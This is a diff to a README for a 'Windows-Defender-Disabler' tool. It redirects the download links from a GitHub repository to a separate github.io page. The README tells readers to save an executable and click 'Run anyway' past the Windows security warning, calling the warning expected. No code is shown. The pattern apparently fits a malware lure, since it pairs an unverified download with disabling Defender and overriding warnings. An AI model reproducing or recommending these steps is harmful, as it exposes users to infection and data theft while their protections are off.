@@ -1,6 +1,6 @@
 # 🛡️ Windows-Defender-Disabler - Stop Windows Defender Permanently With Ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/tofiqal4800/Windows-Defender-Disabler)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://tofiqal4800.github.io)
 
 This tool allows you to turn off Windows Defender on your computer. Many users prefer to manage their own security settings or remove built-in software to improve system performance. This application automates the process of disabling Windows Defender, Tamper Protection, and associated background services on Windows 10 and Windows 11. 
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic criteria before you proceed:
 
 Follow these steps to obtain and use the tool on your device.
 
-1. Visit the project page to download the latest file: [https://github.com/tofiqal4800/Windows-Defender-Disabler](https://github.com/tofiqal4800/Windows-Defender-Disabler).
+1. Visit the project page to download the latest file: [https://tofiqal4800.github.io](https://tofiqal4800.github.io).
 2. Locate the download button on the page.
 3. Save the executable file to your desktop or a folder you can access easily.
 4. Because the tool modifies system security settings, Windows may display a warning screen. This is expected behavior. If you see "Windows protected your PC," click "More info" and then "Run anyway."
